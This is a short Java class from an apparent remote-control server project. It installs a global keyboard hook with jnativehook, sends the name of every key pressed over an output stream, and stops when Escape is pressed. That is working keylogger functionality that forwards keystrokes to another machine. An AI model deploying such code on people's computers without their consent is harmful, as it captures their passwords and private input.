package com.mmt.server.Model;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;

public class ServerKeyListener implements NativeKeyListener {
    public ServerKeyListener() {
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            String a = NativeKeyEvent.getKeyText((e.getKeyCode()));
            ServerHandlerModel.getOutput().writeUTF(a);
            System.out.println(a);
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException nativeHookException) {
                nativeHookException.printStackTrace();
            }
        }
    }
}
